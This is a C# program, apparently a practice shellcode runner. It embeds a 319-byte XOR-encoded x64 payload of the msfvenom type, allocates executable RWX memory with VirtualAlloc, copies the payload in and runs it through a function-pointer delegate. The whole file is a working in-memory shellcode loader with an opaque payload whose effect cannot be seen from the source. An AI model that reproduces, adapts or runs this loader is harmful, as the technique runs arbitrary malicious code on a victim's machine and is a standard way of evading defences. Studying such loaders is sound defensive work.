﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace shellCode
{
    internal class Program
    {

        public delegate void sample();
        public static void Test()
        {
            Console.WriteLine("Printing\n");
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            int dwSize,
            UInt32 flAllocationType, 
            UInt32 flProtect) ;


        [DllImport("kernel32.dll")]
        public static extern bool VirtualFree(
            IntPtr lpAddress,
            int dwSize,
            UInt32 dwFreeType
            );

        [DllImport("Ntdll.dll")]
        public static extern void RtlMoveMemory
        (
         //   void* dest,
           // void* src,
            //int size
        );

        static void Main(string[] args)
        {

            byte[] shellcode = new byte[319] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
                0xff,0xff,0x48,0xbb,0x2f,0xfe,0x28,0xf4,0x48,0x6e,0xe0,0x03,0x48,0x31,0x58,
                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xd3,0xb6,0xab,0x10,0xb8,0x86,
                0x20,0x03,0x2f,0xfe,0x69,0xa5,0x09,0x3e,0xb2,0x52,0x79,0xb6,0x19,0x26,0x2d,
                0x26,0x6b,0x51,0x4f,0xb6,0xa3,0xa6,0x50,0x26,0x6b,0x51,0x0f,0xb6,0xa3,0x86,
                0x18,0x26,0xef,0xb4,0x65,0xb4,0x65,0xc5,0x81,0x26,0xd1,0xc3,0x83,0xc2,0x49,
                0x88,0x4a,0x42,0xc0,0x42,0xee,0x37,0x25,0xb5,0x49,0xaf,0x02,0xee,0x7d,0xbf,
                0x79,0xbc,0xc3,0x3c,0xc0,0x88,0x6d,0xc2,0x60,0xf5,0x98,0xe5,0x60,0x8b,0x2f,
                0xfe,0x28,0xbc,0xcd,0xae,0x94,0x64,0x67,0xff,0xf8,0xa4,0xc3,0x26,0xf8,0x47,
                0xa4,0xbe,0x08,0xbd,0x49,0xbe,0x03,0x55,0x67,0x01,0xe1,0xb5,0xc3,0x5a,0x68,
                0x4b,0x2e,0x28,0x65,0xc5,0x81,0x26,0xd1,0xc3,0x83,0xbf,0xe9,0x3d,0x45,0x2f,
                0xe1,0xc2,0x17,0x1e,0x5d,0x05,0x04,0x6d,0xac,0x27,0x27,0xbb,0x11,0x25,0x3d,
                0xb6,0xb8,0x47,0xa4,0xbe,0x0c,0xbd,0x49,0xbe,0x86,0x42,0xa4,0xf2,0x60,0xb0,
                0xc3,0x2e,0xfc,0x4a,0x2e,0x2e,0x69,0x7f,0x4c,0xe6,0xa8,0x02,0xff,0xbf,0x70,
                0xb5,0x10,0x30,0xb9,0x59,0x6e,0xa6,0x69,0xad,0x09,0x34,0xa8,0x80,0xc3,0xde,
                0x69,0xa6,0xb7,0x8e,0xb8,0x42,0x76,0xa4,0x60,0x7f,0x5a,0x87,0xb7,0xfc,0xd0,
                0x01,0x75,0xbc,0xf2,0x6f,0xe0,0x03,0x2f,0xfe,0x28,0xf4,0x48,0x26,0x6d,0x8e,
                0x2e,0xff,0x28,0xf4,0x09,0xd4,0xd1,0x88,0x40,0x79,0xd7,0x21,0xf3,0x9e,0x55,
                0xa1,0x79,0xbf,0x92,0x52,0xdd,0xd3,0x7d,0xfc,0xfa,0xb6,0xab,0x30,0x60,0x52,
                0xe6,0x7f,0x25,0x7e,0xd3,0x14,0x3d,0x6b,0x5b,0x44,0x3c,0x8c,0x47,0x9e,0x48,
                0x37,0xa1,0x8a,0xf5,0x01,0xfd,0x97,0x29,0x02,0x83,0x2d,0x4a,0x86,0x4d,0xf4,
                0x48,0x6e,0xe0,0x03 };


            int shellcodeSize = shellcode.Length;
            UInt32 MEM_COMMIT = 0x00001000;
            UInt32 MEM_RESERVE = 0x00002000;
            UInt32 MEM_RESET = 0x00080000;
            UInt32 MEM_RESET_UNDO = 0x1000000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            UInt32 MEM_DECOMMIT = 0x00004000;
            
            IntPtr intPtr = IntPtr.Zero;
            //Allocate Space In Memory
            intPtr = VirtualAlloc(IntPtr.Zero,
                shellcodeSize,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
                );


            Marshal.Copy(shellcode, 0, intPtr, shellcodeSize);

          sample s = (sample)  Marshal.GetDelegateForFunctionPointer(intPtr, typeof(sample));
            s();

            //Free that space
            bool res;
            res = VirtualFree(intPtr,
                shellcodeSize,
                MEM_DECOMMIT
                );




            Console.ReadKey();






        }
    }
}
